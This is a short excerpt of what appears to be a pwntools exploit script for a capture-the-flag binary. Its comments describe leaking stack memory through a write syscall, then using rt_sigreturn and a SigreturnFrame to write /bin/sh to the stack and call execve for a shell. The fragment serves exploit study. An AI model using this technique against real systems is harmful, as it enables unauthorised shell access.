...
# $rax is be set to 1 (return value of read) at this point. Returning to
# 0x4000bb causes $rdi to set to 1 and execute syscall. write will be called and
# 1024 bytes of $rsp will be written to STDOUT.
d = r.read(1024)
...
log.info("Now, the $rsp is set to a known adress. Write /bin/sh to the stack and call execve, again using rt_sigreturn")
pause()
frame = SigreturnFrame(kernel='amd64')
